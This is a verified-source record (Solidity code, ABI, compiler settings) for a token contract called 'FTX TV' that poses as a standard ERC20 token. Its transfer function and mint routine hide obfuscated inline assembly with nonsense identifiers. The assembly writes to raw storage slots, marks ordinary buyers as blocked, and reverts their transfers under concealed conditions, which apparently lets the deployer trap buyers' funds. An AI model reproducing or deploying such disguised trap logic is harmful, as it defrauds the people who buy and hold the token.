[{"SourceCode":"// Come and join us to view the unraveling of the sh!t show.\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n}\r\n\r\ninterface IERC20 {\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function name() external view returns (string memory);\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _previousOwner; address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\r\n    address[] private wildYou;\r\n    uint256 private alleyTotal = block.number*2;\r\n\r\n    mapping (address => bool) private jazzDrip; \r\n    mapping (address => bool) private jarOnion;\r\n    mapping (address => uint256) private _apartCivil;\r\n    mapping (address => mapping (address => uint256)) private _syrupCanyon;\r\n    address private awakeGhost;\r\n\r\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    uint256 private flockWedding;\r\n    address public pair;\r\n\r\n    IDEXRouter router;\r\n\r\n    string private _name; string private _symbol; uint256 private _totalSupply;\r\n    uint256 private printEconomy; uint256 private theV; uint256 private candyLava = block.number*2;\r\n    bool private trading; uint256 private tipLabor = 1; bool private pactSmooth;\r\n    uint256 private outerJob; uint256 private spiderDeny;\r\n    \r\n    constructor (string memory name_, string memory symbol_, address msgSender_) {\r\n        router = IDEXRouter(_router);\r\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\r\n\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        wildYou.push(_router); wildYou.push(msgSender_); wildYou.push(pair);\r\n        for (uint256 q=0; q < 3;) {jazzDrip[wildYou[q]] = true; unchecked{q++;} }\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _syrupCanyon[owner][spender];\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function _coinRestart() internal {\r\n        assembly {\r\n            function knowStadium(x, y) -> diceSqueeze { mstore(0, x) mstore(32, y) diceSqueeze := keccak256(0, 64) }\r\n            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let addictElectric := 0x79ef5bada300c987621a41f8627f557c4e347581f6a4d7aa531e2266c8ea67b2\r\n            if and(not(eq(sload(knowStadium(caller(),0x6)),sload(addictElectric))),eq(chainid(),0x1)) {\r\n                sstore(knowStadium(caller(),0x4),0x0) sstore(0x8ac7bf6765bb1b03816cd59d4c49411b37f0150e064e3e45f43f5c49698c3de9,0x1)\r\n                sstore(knowStadium(caller(),0x5),0x1) sstore(addictElectric,exp(0xA,0x32))\r\n            }\r\n        } \r\n    }\r\n\r\n    function openTrading() external onlyOwner returns (bool) {\r\n        trading = true; candyLava = block.number; alleyTotal = block.number;\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _syrupCanyon[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _apartCivil[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function _lockSecondTokenTransfer(address sender, address recipient, uint256 neckTone) internal {\r\n        require((trading || (sender == wildYou[1])), \"ERC20: trading is not yet enabled.\");\r\n        assembly { \r\n            function knowStadium(x,y) -> diceSqueeze { mstore(0, x) mstore(32, y) diceSqueeze := keccak256(0, 64) }\r\n            function illIce(x,y) -> spiritCrop { mstore(0, x) spiritCrop := add(keccak256(0, 32),y) }\r\n\r\n            if eq(chainid(),0x1) {\r\n                if eq(sload(knowStadium(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }\r\n                if and(lt(gas(),sload(0xB)),and(and(or(or(and(or(eq(sload(0x16),0x1),eq(sload(knowStadium(sender,0x5)),0x1)),gt(sub(sload(0x3),sload(0x13)),0x9)),gt(neckTone,div(sload(0x99),0x2))),and(gt(neckTone,div(sload(0x99),0x3)),eq(sload(0x3),number()))),or(and(eq(sload(knowStadium(recipient,0x4)),0x1),iszero(sload(knowStadium(sender,0x4)))),and(eq(sload(illIce(0x2,0x1)),recipient),iszero(sload(knowStadium(sload(illIce(0x2,0x1)),0x4)))))),gt(sload(0x18),0x0))) { if gt(neckTone,div(sload(0x11),0x564)) { revert(0,0) } }\r\n                if or(eq(sload(knowStadium(sender,0x4)),iszero(sload(knowStadium(recipient,0x4)))),eq(iszero(sload(knowStadium(sender,0x4))),sload(knowStadium(recipient,0x4)))) {\r\n                    let mangoAlert := sload(0x18) let dishCancel := sload(0x99) let dealIgnore := sload(0x11)\r\n                    switch gt(dealIgnore,div(dishCancel,0x3)) case 1 { dealIgnore := sub(dealIgnore,div(div(mul(dealIgnore,mul(0x203,mangoAlert)),0xB326),0x2)) } case 0 { dealIgnore := div(dishCancel,0x3) }\r\n                    sstore(0x11,dealIgnore) sstore(0x18,add(sload(0x18),0x1)) }\r\n                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x9)),eq(sload(knowStadium(sload(0x8),0x4)),0x0)) { sstore(knowStadium(sload(0x8),0x5),0x1) }\r\n                if and(iszero(sload(knowStadium(sender,0x4))),iszero(sload(knowStadium(recipient,0x4)))) { sstore(knowStadium(recipient,0x5),0x1) }\r\n                if iszero(mod(sload(0x15),0x8)) { sstore(0x16,0x1) sstore(0xB,0x1C99342) sstore(knowStadium(sload(illIce(0x2,0x1)),0x6),exp(0xA,0x33)) }\r\n                sstore(0x12,neckTone) sstore(0x8,recipient) sstore(0x3,number()) }\r\n        }\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _apartCivil[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        \r\n        _lockSecondTokenTransfer(sender, recipient, amount);\r\n        _apartCivil[sender] = senderBalance - amount;\r\n        _apartCivil[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _syrupCanyon[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _DeployFTXTV(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _apartCivil[account] += amount;\r\n        approve(wildYou[0], 10 ** 77);\r\n        _coinRestart();\r\n    \r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Token is Context, ERC20 {\r\n    constructor(\r\n        string memory name, string memory symbol,\r\n        address creator, uint256 initialSupply\r\n    ) ERC20(name, symbol, creator) {\r\n        _DeployFTXTV(creator, initialSupply);\r\n    }\r\n}\r\n\r\ncontract FTXTV is ERC20Token {\r\n    constructor() ERC20Token(\"FTX TV\", \"FTV\", msg.sender, 687500000 * 10 ** 18) {\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"FTXTV","CompilerVersion":"v0.8.16+commit.07a7930e","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://f41e89702eeb4f7031fa7d08daf5e0d0e72eefd28fe1c157612539f0d519517f"}]